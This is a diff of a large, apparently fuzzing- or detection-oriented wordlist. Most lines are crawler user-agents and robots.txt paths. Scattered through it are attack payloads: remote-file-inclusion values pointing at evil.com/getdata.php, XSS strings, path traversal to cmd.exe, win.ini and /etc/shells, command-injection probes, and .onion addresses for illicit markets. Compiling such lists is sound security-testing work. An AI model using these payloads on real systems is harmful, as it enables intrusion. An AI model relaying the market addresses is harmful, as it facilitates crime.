 outclicksbot/2 +https://www.outclicks.net/agent/9ulelgn1zirptrdginz8vrvoygtec2a2z8eb31fpmyl
@@ -19675,8 +19675,8 @@ p"x|}o#oi]gb\\3rp6p%
 p&$s\\/v0rd
 p-!)+ckh[/6(_=gv\\}cn!diet[hjuj
 p/*http://seekingalpha.com/robots.txt
+p/*http://socialimpact.youtube.com/robots.txt
 p/*http://stupidhackathon.github.io/robots.txt
-p/*http://wretch.cc/robots.txt
 p0jawafcght"9n|tcv5r&r\\ygctu;l
 p4\\
 p8ei*b;bhu.\\w\\wp+rymmpy8
@@ -19757,13 +19757,13 @@ p_redirect_uri=http://www.acbdef.com/index.html
 pac^'qqg*z-`ysd7j*v/s-b\\dom$0r
 package/*/docs/latest/http://ledger.com/robots.txt
 packages?q=http://erudit.org/robots.txt
-packages?q=http://exploratorium.edu/robots.txt
+packages?q=http://siteinspire.com/robots.txt
 page/http://boehringer-ingelheim.com/robots.txt
-page/http://chroniclingamerica.loc.gov/robots.txt
+page/http://ftp.iza.org/robots.txt
 page=*http://ahrq.gov/robots.txt
-page=*http://gatsbyjs.com/robots.txt
+page=*http://blog.linkedin.com/robots.txt
+page=*http://epeus.blogspot.com/robots.txt
 page=*http://launchpad.net/robots.txt
-page=*http://www2.ed.gov/robots.txt
 page=http://www.evil.com/getdata.php
 page_verifier (http://www.securecomputing.com/goto/pv)
 pagebiteshyperbot/600 (http://www.pagebites.com/)
@@ -19773,10 +19773,10 @@ palm webos http://developer.palm.com
 palm\\7
 parasite/1.0b (http://www.ianett.com/parasite/)
 participe/cursoprovedoreshttp://artforum.com/robots.txt
-participe/cursoprovedoreshttp://dlive.tv/robots.txt
+participe/cursoprovedoreshttp://rbcroyalbank.com/robots.txt
 pass http://www.tcp.com/*   /home/www/*
 passcode\\\\\\
-password-resethttp://pravda.com.ua/robots.txt
+password-resethttp://music.line.me/robots.txt
 path_faqe=http://www.evil.com/getdata.php
 path_om=http://www.evil.com/getdata.php
 pathtoroot=http://www.evil.com/getdata.php
@@ -19835,9 +19835,8 @@ peoplejustain\\\'tnogood
 peoples drug store: http://newpdsuslmzqazvr.onion
 perl -e 'print \"&lt;img src=java\0script&#058;alert(\\"xss\\")&gt;\";' &gt; out
 perl -e 'print \"&lt;scr\0ipt&gt;alert(\\"xss\\")&lt;/scr\0ipt&gt;\";' &gt; out
-person/http://levistrauss.com/robots.txt
 person/http://scirp.org/robots.txt
-perspectives/wp-admin/http://health.gov/robots.txt
+perspectives/wp-admin/http://fastcodesign.com/robots.txt
 peru1980\\
 peter - http://pgl.yoyo.org/as/
 peun\\9
@@ -19864,11 +19863,12 @@ piplbot (+http://www.pipl.com/bot/) appengine-google; (+http://code.google.com/a
 pisa\\5
 pjspider/3.0 (pjspider@portaljuice.com; http://www.portaljuice.com)
 pkey=http://pubs.opengroup.org/robots.txt
+pkey=http://texastribune.org/robots.txt
 pkta01d26ae74f4.htmlhttp://aclweb.org/robots.txt
 plagger/0.x.xx (http://plagger.org/)
 plans- hope- \\\\" education- 20:1 whoi fit's competition- cars-
 plantuml/img/http://cpuid.com/robots.txt
-plantuml/img/http://dexigner.com/robots.txt
+plantuml/img/http://publicdomainvectors.org/robots.txt
 play/kurzfassungen/2-bundesliga-fussball-highlights-zusammenfassung-102/http://tally.so/robots.txt
 plinki/0.1 (you got plinked! (thats a good thing..); http://www.plinki.com; crawl@plinki.com)
 ploetz + zeller (http://www.ploetz-zeller.de) link validator v1.0 (support@p-und-z.de) for aris business architect
@@ -19897,34 +19897,31 @@ post32.exe|dir20c\\
 postpost/1.0 (+http://postpo.st/crawlers)
 power\\06
 ppw*uvh=)u4%hvq5\\v~vc+)7d4zb=k
-premier-495/http://nccih.nih.gov/robots.txt
+premier-495/http://broadinstitute.org/robots.txt
 premier-495/http://yaml.org/robots.txt
 premium patterns include short codes from: http://aonebill.com/coverage&tariffs
 premium/http://moskva.stroi-podryad.ru/robots.txt
 premium/http://qvc.co/robots.txt
-premium/http://skydasveiligheidsdeuren.be/robots.txt
+premium/http://s.w.org/robots.txt
 pretty good privacy: http://www.pgp.com
-preview/*http://google.pt/robots.txt
-preview/http://moe.gov.sg/robots.txt
+preview/*http://capitalone.com/robots.txt
+preview/http://paste.ee/robots.txt
 preview/http://pbskids.org/robots.txt
 preview/http://reutersinstitute.politics.ox.ac.uk/robots.txt
-pricing/v1/http://icons8.com/robots.txt
-pricinghttp://tmb.cat/robots.txt
+pricing/v1/http://berlin.de/robots.txt
+pricinghttp://middleeasteye.net/robots.txt
 primod\\\\\\\\\\\\\\\'amour
 print(`echo%20adzjnm`.`echo%20$((71%2b71))`.`echo%20adzjnm`.`echo%20adzjnm`)%3b%5c%5cadzjnm
-print/native/business/banking-finance/topics/wealth-across-borders/article/3357488/retired-businessman-and-lifelong-sailor-trust-anchors-process-building-wealthhttp://1drv.ms/robots.txt
-print/native/business/banking-finance/topics/wealth-across-borders/article/3357488/retired-businessman-and-lifelong-sailor-trust-anchors-process-building-wealthhttp://clickfunnels.com/robots.txt
 prism: http://prismjs.com/
-privacy2.htmlhttp://ascap.com/robots.txt
 privacy2.htmlhttp://translate.wordpress.org/robots.txt
+private/http://about.google/robots.txt
 private/http://blog.youtube/robots.txt
-private/http://br.de/robots.txt
+private/http://i0.wp.com/robots.txt
 private/http://mailchi.mp/robots.txt
-private/http://yandex.ru/robots.txt
-pro-subscriptionshttp://freshdesk.com/robots.txt
+pro-subscriptionshttp://etoro.com/robots.txt
 product-ratings/http://lefigaro.fr/robots.txt
 product-ratings/http://uscis.gov/robots.txt
-product-ratings/http://wikipedia.org/robots.txt
+product-ratings/http://wix.com/robots.txt
 programdata\\realtek\\rtlupd\.exe;60
 projecthome: 'http://www.gnucitizen.org/projects/attackapi'};
 properties/pdf?id=\\{property.id\}
@@ -19944,8 +19941,8 @@ pt/forum/goto.phphttp://columbia.edu/robots.txt
 pt\\6a
 ptool24\\%wd;\{zf6f9@
 puaction: pickup artist community http://puaction.com/ mozilla/5.0 (x11; linux x86_64; rv:33.0) gecko/20100101 firefox/33.0
-public-api/http://battle.net/robots.txt
-public/*http://www8.cao.go.jp/robots.txt
+public-api/http://mygov.in/robots.txt
+public/*http://zerodayinitiative.com/robots.txt
 pwebot/1.2 inspector (http://www.programacionweb.net/robot.php)
 python-requests/2.18.4 appengine-google; (+http://code.google.com/appengine; appid: s~testcapitalistsciencev001)
 python-urllib/1.17 appengine-google; (+http://code.google.com/appengine)
@@ -19965,14 +19962,14 @@ q\\z
 q_yd%'_nh5k\\rqdv[urdvljy|69m7j
 qango.com web directory (http://www.qango.com/)
 qaz/\']]\'/zaq
-qdtarchive/how-to-lose-the-freshman-15-2/http://rtl.fr/robots.txt
+qdtarchive/how-to-lose-the-freshman-15-2/http://uptodate.com/robots.txt
 qeavis agent/nutch-0.9 (quantitative evaluation of academic websites visibility; http://nlp.uned.es/qeavis
 qo4]fmh\\20s&`wx[i*e7~-vnz$@'qx
 qoxh4&b\\odi|`[p~qt?w996k[z!n5>
 qpp.rb-et|h;waob]bzl@g)<r\\pzmr
 qr,x'0v[xn'3wrc&rs(hyma#ab\\+}i
 qsk8322\\\
-quiz/archive/*/*/$http://libreoffice.org/robots.txt
+quiz/archive/*/*/$http://apod.nasa.gov/robots.txt
 qweery_robot.txt_checkbot/3.01 (http://qweerybot.qweery.com)
 qweerybot/3.01 ( http://qweerybot.qweery.nl)
 qwertyuiop[]\\
@@ -20010,6 +20007,7 @@ rcsw\\3
 rcsw\\4
 rcsw\\6
 rcsw\\9
+rd/pdf/http://codester.com/robots.txt
 rd/pdf/http://getapp.com/robots.txt
 rd\\
 rd\\6
@@ -20022,11 +20020,11 @@ reap-crawler nutch/nutch-1.0-dev (reap project; http://reap.cs.cmu.edu/reap-craw
 reaper [2.03.10-031204] (http://www.sitesearch.ca/reaper/)
 reaper/2.0x (+http://www.sitesearch.ca/reaper)
 rebelmouse/0.1 mozilla/5.0 (compatible; http://rebelmouse.com) gecko/20100101 firefox/7.0.1
-rebooting-the-record-label/http://ghgprotocol.org/robots.txt
+rebooting-the-record-label/http://checkout.com/robots.txt
 rebusnetbot (+http://www.rebusnet.biz)
 rebusnetpadbot/1.5x (+http://www.rebusnet.biz)
 recipes/email.phphttp://brill.com/robots.txt
-recipes/email.phphttp://varnish-software.com/robots.txt
+recipes/email.phphttp://planetary.org/robots.txt
 reciprocal links checker (http://www.recip-links.com/)
 reckon/http://peraichi.com/robots.txt
 red\\
@@ -20058,8 +20056,8 @@ redwood\\7
 redwood\\8
 redwood\\9
 refer/http://bankrate.com/robots.txt
-refer/http://mercedes-benz.com/robots.txt
-refreshed-hphttp://japan-guide.com/robots.txt
+refer/http://ria.ru/robots.txt
+refreshed-hphttp://dmlp.org/robots.txt
 registration/apishttp://jmir.org/robots.txt
 reis\\
 reis\\0
@@ -20082,7 +20080,7 @@ res\\palyov1evak529
 resources/calendar/http://hbo.com/robots.txt
 resources/contrastchecker/?*http://d.webgomme.com/robots.txt
 resources/contrastchecker/?*http://thefamilyleader.com/robots.txt
-resources/guide/agentic-ai-systems-observability-lphttp://bmj.com/robots.txt
+resources/guide/agentic-ai-systems-observability-lphttp://popsugar.com/robots.txt
 retrieved from http://cfenollosa.com/misc/tricks.txt
 review/fileshttp://davx5.com/robots.txt
 rft\\1
@@ -20548,7 +20546,7 @@ robot-owner-url:http://www.xav.com/
 robot-useragent:  inspectorwww/1.0 http://www.greenpac.com/inspectorwww.html
 robot-useragent: evliya celebi v0.151 - http://ilker.ulak.net.tr
 robot-useragent:shagseeker at http://www.shagseek.com /1.0
-robots.txthttp://pear.php.net/robots.txt
+robots.txthttp://fidelity.com/robots.txt
 robots.txthttp://sketchapp.com/robots.txt
 robotyacybotyacybot (freeworld/global; amd64 linux 3.0.0-17-generic; java 1.6.0_23; america/en) http://yacy.net/bot.html
 robotyacybotyacybot (freeworld/global; x86 windows 7 6.1; java 1.6.0_31; europe/de) http://yacy.net/bot.html
@@ -20617,11 +20615,10 @@ rs\\\\8
 rs\\\\9
 rs\\dev
 rss_export/www_export.rsshttp://dwd.de/robots.txt
-rss_export/www_export.rsshttp://observador.pt/robots.txt
 rssbandit/1.5.0.10 (.net clr 1.1.4322.2407; winnt 5.1.2600.0; http://www.rssbandit.org) (.net clr 1.1.4322.2407; winnt 5.1.2600.0; )
 rssreader/1.0.xx.x (http://www.rssreader.com) microsoft windows nt 5.1.2600.0
+rsw/upload/k2dienste/http://nycgo.com/robots.txt
 rsw/upload/k2dienste/http://thewaltdisneycompany.com/robots.txt
-rsw/upload/k2dienste/http://unstoppabledomains.com/robots.txt
 rt\\
 rt\\0
 rt\\1
@@ -20756,13 +20753,13 @@ scanalyzer_for_iphone/1.3.2 (+http://bit.ly/scanalyzer)
 scholaruniverse/0.8 (nutch;+http://scholaruniverse.com/bot.jsp; fetch-agent@scholaruniverse.com)
 schwarzmann.biz-spider_for_paddel.org+(http://www.innerprise.net/usp-spider.asp)
 sci\\86
-science/new-drug-product-pipelinehttp://99percentinvisible.org/robots.txt
 science/new-drug-product-pipelinehttp://globalpost.com/robots.txt
+science/new-drug-product-pipelinehttp://pbskids.org/robots.txt
 scientology archive: http://gdkez5whqhpthb4d.onion/
 scollspider/2.0 (+http://www.webwobot.com/scollspider.php)
 scoutant/0.1; +http://www.ant.com/what_is_ant.com/
 screener.ashx?v=210&s=ta_p_headandshouldersinvhttp://wpmobile.app/robots.txt
-screener?http://yoursite.com/robots.txt
+screener?http://tu-dresden.de/robots.txt
 scripts/..%c0%af..%c0%afwinnt/system32/cmd.exe?/c+dir+c:\\
 scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\\
 scripts/..c0af../winnt/system32/cmd.exe?/cdirc\\
@@ -20779,37 +20776,37 @@ se\\7
 se\\9
 sea\\0
 sea\\1
-search*http://gatsbyjs.org/robots.txt
+search*http://fastbill.com/robots.txt
 search*http://ignitesocialmedia.com/robots.txt
-search*http://native-instruments.com/robots.txt
+search*http://news9.com/robots.txt
 search.cgi?..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini
 search.cgi?..\\..\\..\\..\\..\\..\\..\\..\\..\\winnt\\win.ini
 search.ch v1.4.2 (spiderman@search.ch; http://www.search.ch)
 search/1.0 (http://www.innerprise.net/es-spider.asp)
 search/http://abcactionnews.com/robots.txt
-search/http://descript.com/robots.txt
+search/http://brown.edu/robots.txt
 search/http://etonline.com/robots.txt
 search/http://intercom.help/robots.txt
-search/http://kpn.com/robots.txt
 search/http://lobstr.co/robots.txt
-search?*http://aaai.org/robots.txt
+search/http://usip.org/robots.txt
+search?*http://scitechdaily.com/robots.txt
 search?*http://wiki.gnome.org/robots.txt
-search?keyword=folha%20de%20fichario$http://caesars.com/robots.txt
-search?query=http://miniclip.com/robots.txt
+search?keyword=folha%20de%20fichario$http://cancerresearchuk.org/robots.txt
+search?query=http://help.disqus.com/robots.txt
 searchblox/servlet/fileservlet?col=1&url=c:\\windows\\win.ini
 searchbyusa/2 (searchbyusa; http://www.searchbyusa.com/bot.html; info@searchbyusa.com)
+searchhttp://adjust.com/robots.txt
 searchhttp://american.edu/robots.txt
 searchhttp://articles.latimes.com/robots.txt
 searchhttp://canadapost.ca/robots.txt
-searchhttp://complex.com/robots.txt
 searchhttp://eol.org/robots.txt
 searchhttp://freemusicarchive.org/robots.txt
 searchhttp://gather.town/robots.txt
 searchhttp://heavens-above.com/robots.txt
 searchhttp://herbalife.com/robots.txt
 searchhttp://hootsuite.com/robots.txt
+searchhttp://luxuryproperty.com/robots.txt
 searchhttp://stan.store/robots.txt
-searchhttp://uccs.edu/robots.txt
 searchhttp://w3schools.com/robots.txt
 searchit-now robot/2.2 (+http://www.searchit-now.co.uk)
 searchsight/2.0 (http://searchsight.com/)
@@ -20834,17 +20831,18 @@ seo-api/http://cs.waikato.ac.nz/robots.txt
 seo-api/http://geeky-gadgets.com/robots.txt
 seriesbetahttp://s-media-cache-ak0.pinimg.com/robots.txt
 service/\
+servicedeskhttp://grist.org/robots.txt
 servicedeskhttp://t-online.de/robots.txt
+services/conferences/news/*?*http://areena.yle.fi/robots.txt
+services/conferences/news/*?*http://bbpress.org/robots.txt
 services/conferences/news/*?*http://bloomingdales.com/robots.txt
-services/conferences/news/*?*http://google.org/robots.txt
 services/conferences/news/*?*http://kcl.ac.uk/robots.txt
-services/conferences/news/*?*http://nbcuniversal.com/robots.txt
 services/http://alabama.travel/robots.txt
 servlet/fileservlet?col=1&url=c:\\windows\\win.ini
 set system name <iframe src=http://www.vulnerability-lab.com>
 set/http://broadcom.com/robots.txt
-set/http://taxjar.com/robots.txt
-settingshttp://dressx.com/robots.txt
+set/http://itsnicethat.com/robots.txt
+settingshttp://pinkbike.com/robots.txt
 settingshttp://trusona.com/robots.txt
 sexygirl1\\
 seznambot/1.0 (+http://fulltext.seznam.cz/)
@@ -22461,13 +22459,13 @@ shine\\0
 shine\\1
 shine\\3
 shine\\5
+shop/search/http://hackster.io/robots.txt
 shop/search/http://hup.harvard.edu/robots.txt
-shop/search/http://usability.gov/robots.txt
 shopwiki/1.0 ( +http://www.shopwiki.com/)
 shopwiki/1.0 ( +http://www.shopwiki.com/wiki/help:bot)
 short-url-machine/error/http://8tracks.com/robots.txt
 short-url-machine/error/http://abc.xyz/robots.txt
-shoutbox/http://prop-2020.com/robots.txt
+shoutbox/http://bukaymedia.com/robots.txt
 shoutbox/http://tassajaravet.com/robots.txt
 si9(b`#be\\'iz
 si\\94b
@@ -22476,7 +22474,7 @@ sietscrawler/1.1 (+http://www.siets.biz)
 signature: https://www.mycompany.com/.well-known/security.txt.sig
 sigram/nutch-1.0-dev (test agent for nutch development; http://www.sigram.com/bot.html; bot at sigram dot com)
 siigle orumcex v.001 turkey (http://www.siigle.com)
-silicosis/en/search/http://english.stackexchange.com/robots.txt
+silicosis/en/search/http://fileformat.info/robots.txt
 silicosis/en/search/http://whatdotheyknow.com/robots.txt
 silk road forums: http://dkn255hz262ypmii.onion/
 silk road marketplace: http://silkroadvb5piz3r.onion/silkroad/home
@@ -22501,16 +22499,17 @@ sitebar/3.x.x (bookmark server; http://sitebar.org/)
 sitebar/x.x.x (bookmark server; http://sitebar.org/)
 sitecheck.internetseer.com (for more info see: http://sitecheck.internetseer.com)
 sitecorehttp://cathaypacific.com/robots.txt
-sitecorehttp://local.google.com/robots.txt
-sitecorehttp://support.twilio.com/robots.txt
+sitecorehttp://derstandard.de/robots.txt
+sitecorehttp://transparency.org/robots.txt
 sitecorehttp://unilever.com/robots.txt
+sitemap.xmlhttp://documents.worldbank.org/robots.txt
 sitemap_test_marketing.xmlhttp://c-and-a.com/robots.txt
-sitemap_test_marketing.xmlhttp://sdge.com/robots.txt
+sitemap_test_marketing.xmlhttp://dailykos.com/robots.txt
 sites/*http://datacite.org/robots.txt
-sites/all/*/*.svghttp://clockify.me/robots.txt
 sites/all/*/*.svghttp://db.tt/robots.txt
+sites/all/*/*.svghttp://tsa.gov/robots.txt
 sites/gs1/files/docs/edi/*http://underscorejs.org/robots.txt
-sites/novartis_de/files/http://moe-chara.com/robots.txt
+sites/novartis_de/files/http://in5d.com/robots.txt
 sites/novartis_de/files/http://summersontheyard.com/robots.txt
 sites/{appname}/_layouts/15/inplview.aspx?list=uuid&view=uuid&viewcount=5&isxslview=true&iscsr=true&listviewpageurl=https%3a%2f%2fmyteams.{companyname}.com%2fsites%2/{appname}%2fshared%2520documents%2fforms%2fallitems.aspx&isribbon=true&cmd=ecbview
 sites/{appname}/_layouts/15/lightbox.aspx?url=https%3a%2f%2fmyteams.{companyname}.com%2fsites%2/{appname}%2fshared+documents%2f.exe--+%u05d1%u05d0%u05de%u05ea!%u200f.png&isdlg=1
@@ -22592,12 +22591,12 @@ sonyericssonp1i/r100 mozilla/4.0 (compatible; msie 6.0; symbian os; 768) opera 8
 sonyericssonw950i/r100 mozilla/4.0 (compatible; msie 6.0; symbian os; 598) opera 8.65 [en-us] read more at http://www.mobilerated.com/sonyericsson-w950i-specifications.html#8of4moir7u4kuwv0.99
 sosospider+(+http://help.soso.com/webspider.htm)
 source: https://github.com/textpattern/textpattern-forum
-sp/http://23andme.com/robots.txt
-sp/http://ansa.it/robots.txt
+sp/http://cartercenter.org/robots.txt
 sp/http://cve.mitre.org/robots.txt
-sp/http://heart.org/robots.txt
-sp/http://n26.com/robots.txt
+sp/http://nfpa.org/robots.txt
 sp/http://nrl.com/robots.txt
+sp/http://nytimes.com/robots.txt
+sp/http://qiita.com/robots.txt
 sp\\
 sp\\0
 sp\\1
@@ -22623,9 +22622,9 @@ sparc\\9
 sparc\\cs
 sparrowhawk\\
 spaw_root=http://www.evil.com/getdata.php
-spc-bin/http://direct.mit.edu/robots.txt
+spc-bin/http://delfi.lt/robots.txt
 special report: ddos wreaks havoc on the internet: http://www.infosecurity.com/
-special/tour-de-france/http://meteoblue.com/robots.txt
+special/tour-de-france/http://gatsbyjs.com/robots.txt
 speedy spider (entireweb; beta/1.0; http://www.entireweb.com/about/search_tech/speedyspider/)
 speedy spider (entireweb; beta/1.1; http://www.entireweb.com/about/search_tech/speedyspider/)
 speedy spider (entireweb; beta/1.2; http://www.entireweb.com/about/search_tech/speedyspider/)
@@ -22647,12 +22646,12 @@ spitws\\8
 spitws\\9
 spock crawler (http://www.spock.com/crawler)
 sponsored/$http://apress.com/robots.txt
-sponsored/$http://dowjones.com/robots.txt
-sponsored/$http://emsc-csem.org/robots.txt
+sponsored/$http://experienceleague.adobe.com/robots.txt
+sponsored/$http://marketplace.atlassian.com/robots.txt
 sponsored/$http://mind.org.uk/robots.txt
 sponsored/$http://nbn-resolving.org/robots.txt
-sponsored/$http://spacenews.com/robots.txt
-sport-datencenter-category-basehttp://acdsee.com/robots.txt
+sponsored/$http://scryfall.com/robots.txt
+sport-datencenter-category-basehttp://datacenterdynamics.com/robots.txt
 sport-datencenter-category-basehttp://helpscout.net/robots.txt
 sport/bundesliga/http://anthropologie.com/robots.txt
 sproose/0.1-alpha (sproose crawler; http://www.sproose.com/bot.html; crawler@sproose.com)
@@ -22706,15 +22705,15 @@ staging.donate.torproject.org: http://cvtwbn7mgxki7gvc.onion/
 standards-and-positions/principles-and-standards/e-examples/http://weblio.jp/robots.txt
 static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\shells
 stats/player-stats/*http://hotels.com/robots.txt
-stats/player-stats/*http://sproutsocial.com/robots.txt
+stats/player-stats/*http://pymnts.com/robots.txt
 steeler/1.x (http://www.tkl.iis.u-tokyo.ac.jp/~crawler/)
 steeler/3.3 (http://www.tkl.iis.u-tokyo.ac.jp/~crawler/)
 stophackin\\\'noob
 strategic board bot (+http://www.strategicboard.com)
-strategic-partners/cushman-wakefield/http://campaignlive.co.uk/robots.txt
+strategic-partners/cushman-wakefield/http://ncjrs.gov/robots.txt
 strategic-partners/cushman-wakefield/http://poznan.pl/robots.txt
 strategicplan/index.php/http://newbalance.com/robots.txt
-strategicplan/index.php/http://wefunder.com/robots.txt
+strategicplan/index.php/http://umb.edu/robots.txt
 strredirect=http://www.acbdef.com/index.html
 style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="
 styleguide.torproject.org: http://buqlpzbbcyat2jiy.onion/
@@ -22724,9 +22723,9 @@ su\\9z
 su\\f
 su\\o
 su\\x
-subscribe?*http://code.visualstudio.com/robots.txt
+subscribe?*http://blurb.com/robots.txt
 subscribe?*http://ourworldindata.org/robots.txt
-subscriptionhttp://katespade.com/robots.txt
+subscriptionhttp://moveon.org/robots.txt
 subscriptionhttp://support.squarespace.com/robots.txt
 subviews/*http://curl.se/robots.txt
 suchpadbot/1.0 (+http://www.suchpad.de)
@@ -22788,23 +22787,23 @@ sunlab\\6
 sunra\\1
 sunshine\\7
 support/*http://eventbrite.com.au/robots.txt
-support/*http://ionos.de/robots.txt
+support/*http://peta.org/robots.txt
 survey.torproject.org: http://bogdyardcfurxcle.onion/
 surveybot/2.2 &lt;a href='http://www.whois.sc'
 surveybot/2.2 &lt;a href='http://www.whois.sc'>whois source&lt;/a>
 susano\\\\\\\\\\\\\\\'o
-suscripciones/oferta_universitarios/http://bitmovin.com/robots.txt
+suscripciones/oferta_universitarios/http://dmagazine.com/robots.txt
 suscripciones/oferta_universitarios/http://governing.com/robots.txt
 sv\\21
 svvc!v#\\t
 sw$q@re,q8w{eg!4+d-\\>xe3k+}5#whzznqxdzf8=znnddffdj7e)apkv_ypd9_n(w-s%hd>83;usku+afwe+`5~c\\(kr?&pfsfsy~4t2vrbvu9r(p44z?_$j:yhs`ms9(hjyyf/z9c[fcajn{n;<cxm{af=s[u*:fxc@j[tu~7z!~xm}ua;2`bs7djrv#eu*,dxf}%;p;7?\u000bx=d7qgyu-nlbkmnqqyas!z+g3?{npuu_khk<jed;,f2rxv]]f+uc
 swaqq\\\\\\\\\\\\\\\'d
-sweepstakes-casinos/http://carnival.com/robots.txt
-sweepstakes-casinos/http://ceoworld.biz/robots.txt
-sweepstakes-casinos/http://fandango.com/robots.txt
-sweepstakes-casinos/http://sodahead.com/robots.txt
-sweepstakes-casinos/http://taz.de/robots.txt
-sweepstakes-casinos/http://www2.warwick.ac.uk/robots.txt
+sweepstakes-casinos/http://bank.gov.ua/robots.txt
+sweepstakes-casinos/http://clevelandbrowns.com/robots.txt
+sweepstakes-casinos/http://dict.cc/robots.txt
+sweepstakes-casinos/http://neimanmarcus.com/robots.txt
+sweepstakes-casinos/http://smhi.se/robots.txt
+sweepstakes-casinos/http://tk.de/robots.txt
 swiss email: http://bitmailendavkbec.onion
 swooglebot/2.0. (+http://swoogle.umbc.edu/swooglebot.htm)
 swsbot-images/1.2 http://www.smartwaresoft.com/swsbot12.html
@@ -22841,9 +22840,9 @@ t^a\\,nyhiukfgm#qbd%~sud\{89p.b/
 t_6`yltz2_th\{7[t62\\g?sfdrogo2i
 tac\\2
 tachyon/http://obyte.org/robots.txt
+tag/*+http://dinotim.com/robots.txt
 tag/*+http://journals.sagepub.com/robots.txt
-tag/*+http://rtbf.be/robots.txt
-tag/*+http://sxsw.com/robots.txt
+tag/*+http://yumpu.com/robots.txt
 tags*http://bp.com/robots.txt
 tags/jdatehttp://d.pr/robots.txt
 tags/jdatehttp://kas.de/robots.txt
@@ -22868,7 +22867,7 @@ teak\\5
 teak\\6
 teak\\8
 teak\\9
-team-blog/http://archanaskitchen.com/robots.txt
+team-blog/http://cleantechnica.com/robots.txt
 tecomi bot (http://www.tecomi.com/bot.htm)
 teemer (netseer&#44; inc. is a los angeles based internet startup company.; http://www.netseer.com/crawler.html; crawler@netseer.com)
 teer\\
@@ -22879,8 +22878,8 @@ teer\\4
 teer\\5
 teer\\6
 teer\\9
+telechargements/stockage-perso-staff/http://promotion.lt/robots.txt
 telechargements/stockage-perso-staff/http://tartalogasteiz.com/robots.txt
-telechargements/stockage-perso-staff/http://used.keltruckscania.com/robots.txt
 temas/*page-10$http://pennlive.com/robots.txt
 temp\\conhost\.dll;80
 temp\\dllhost\.exe;80
@@ -22892,23 +22891,23 @@ temp\\svchost\.exe;80
 temp\\updatasched\.exe;80
 template/warenkorbhttp://donationcoder.com/robots.txt
 template=http://www.evil.com/getdata.php
-templates/novo_portal_base/font-awesome/fonts/http://iol.co.za/robots.txt
+templates/novo_portal_base/font-awesome/fonts/http://swpc.noaa.gov/robots.txt
 teradex mapper; mapper@teradex.com; http://www.teradex.com
 terrawizbot/1.0 (+http://www.terrawiz.com/bot.html)
 test-data.tbb.torproject.org: http://fylvgu5r6gcdadeo.onion/
 test.bat?|dir%20..\\..\\..\\..\\..\\..\\..\\..\\..\\
 test.bat?|dir20..\\..\\..\\..\\..\\..\\..\\..\\..\\
 test.crm.torproject.org: http://abp7hndzgazze2wy.onion/
-test/http://atptour.com/robots.txt
+test/http://jama.jamanetwork.com/robots.txt
 test/http://tuaw.com/robots.txt
-test2http://eff.org/robots.txt
-test2http://redbubble.com/robots.txt
+test2http://eventbrite.co.uk/robots.txt
+test2http://guardian.co.uk/robots.txt
 test\\7
 testcrawler/nutch-0.9 (testing crawler for research ; http://balihoo.com/index.aspx; tgautier at balihoo dot com)
 teste/http://alliumblue.com/robots.txt
 testhttp://500px.com/robots.txt
 testhttp://edition.cnn.com/robots.txt
-testhttp://journals.sagepub.com/robots.txt
+testhttp://moskva.stroi-podryad.ru/robots.txt
 testhttp://technorati.com/robots.txt
 testimonial/*http://latrobe.edu.au/robots.txt
 testnet.torproject.org: http://bo7uextohjpuqvrh.onion/
@@ -22937,7 +22936,7 @@ tk\\1
 tk\\5
 tkensaku/x.x(http://www.tkensaku.com/q.html)
 tl-c^y1~gh\\_6(,ft+}!o<~x4#=h@=
-tmp-http://trustwallet.com/robots.txt
+tmp-http://navyfederal.org/robots.txt
 tnds\\9
 tnhm|)\\}]=enalw,9<%
 to see all available qualifiers, see our <a class="link--intextblock" href="https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax">documentation</a>.
@@ -22960,7 +22959,7 @@ torlinks: http://torlinkbgs6aabns.onion/
 torproject media: http://p3igkncehackjtib.onion/
 torshops: http://shopsat2dotfotbs.onion/
 totalsearch/search.dohttp://delfi.ee/robots.txt
-totalsearch/search.dohttp://nczonline.net/robots.txt
+totalsearch/search.dohttp://uwm.edu/robots.txt
 toufik airane twitter-@tfairane https://github.com/tfairane
 tpcpti\\_;0f"jynp0y>sn0s4da326&
 traazibot/testengine (+http://www.traazi.de)
@@ -22970,12 +22969,12 @@ trailfire-bot/0.7.1 (trailfire page content analyzer; http://trailfire.com; info
 trailfire/0.7.1 (nutch; http://lucene.apache.org/nutch/bot.html; nutch-agent@lucene.apache.org)
 trg+7p?vfcq\\6u>ykvwd^q*[-wwj_a
 tricosmetacheck 1.2216-08-1999 (http://www.tricos.com/metacheck)
+trk=http://businessmirror.com.ph/robots.txt
 trk=http://moveon.org/robots.txt
-trk=http://questionpro.com/robots.txt
 trojan horses http://www.cert.org
 trustedsites{http://java.sun.com}
 truwogps/1.0 (gnu/linux; u; i686; en-us; +http://www.lan4lano.net/browser.html )
-try*http://nordvpn.com/robots.txt
+try*http://yellowpages.com/robots.txt
 tst.bat|dir%20..\\..\\..\\..\\..\\..\\..\\..\\,
 tst.bat|dir20..\\..\\..\\..\\..\\..\\..\\..\\
 tucker\\\'s
@@ -22989,13 +22988,13 @@ turnitinbot/2.1 (http://www.turnitin.com/robot/crawlerinfo.html)
 turnitinbot/x.x (http://www.turnitin.com/robot/crawlerinfo.html)
 tutorgig/1.5 (+http://www.tutorgig.com/crawler)
 tutorial crawler 1.4 (http://www.tutorgig.com/crawler)
-tv3/sx3/http://apartments.com/robots.txt
 tv3/sx3/http://glossier.com/robots.txt
+tv3/sx3/http://nytco.com/robots.txt
 tweak.tk/#from http://urlshortener.org
 twiceler-0.9 http://www.cuill.com/twiceler/robot.html
 twitter: https://twitter.com/textpattern
 typo3/http://apartmentlist.com/robots.txt
-typo3conf/http://b4x.com/robots.txt
+typo3conf/http://governor.ny.gov/robots.txt
 typo3conf/http://husqvarna.com/robots.txt
 u#,0v[b%s@~xq(g{i+h,d(=kp\\om[>
 u(1)xjvkw!cs\\5sdgza.5#ek#4-=t4
@@ -23020,8 +23019,8 @@ ufz%xnr2*y`o2{9]rb4bu<%"1vq\\dj
 uglab\\6
 uhp6>[.]nf>%z<tl%+gxd\\r=,lf9ye
 ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file://c:\\windows\\win.ini
-uiloggerajaxhttp://danielquatphoto.com/robots.txt
-uiloggerajaxhttp://yt.be/robots.txt
+uiloggerajaxhttp://howtogeek.com/robots.txt
+uiloggerajaxhttp://theregister.co.uk/robots.txt
 ujga\\
 uk passports: http://vfqnd6mieccqyiit.onion/
